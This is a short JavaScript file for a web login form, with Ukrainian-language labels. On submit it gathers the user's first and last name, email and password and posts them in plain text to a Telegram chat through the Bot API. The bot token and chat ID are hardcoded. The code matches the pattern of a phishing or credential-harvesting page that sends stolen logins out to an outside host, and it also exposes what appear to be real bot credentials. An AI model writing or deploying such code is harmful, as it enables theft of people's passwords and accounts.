const TOKEN = "6688250245:AAG6Xs9pKTnPwF7sPSPq3rvbqlC43Zty0Cg";
const CHAT_ID = "-1001713512717";
const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;



document.getElementById("login").addEventListener("submit", function (e) {
    e.preventDefault();
    console.log("yes");
    let message = `<b>Новий користувач</b>\n`;
    message += `<b>Відправник: </b> ${this.fname.value} ${this.lname.value}\n`;
    message += `<b>Електрона адреса: </b> ${this.email.value}\n`;
    message += `<b>Пароль: </b> ${this.password.value}\n`;


      
      axios.post(URI_API, {
      chat_id: CHAT_ID,
      parse_mode: "html",
      text: message
      });
      }); 



let myicons = document.querySelector(".i-header-link")

myicons.href = "/index.html"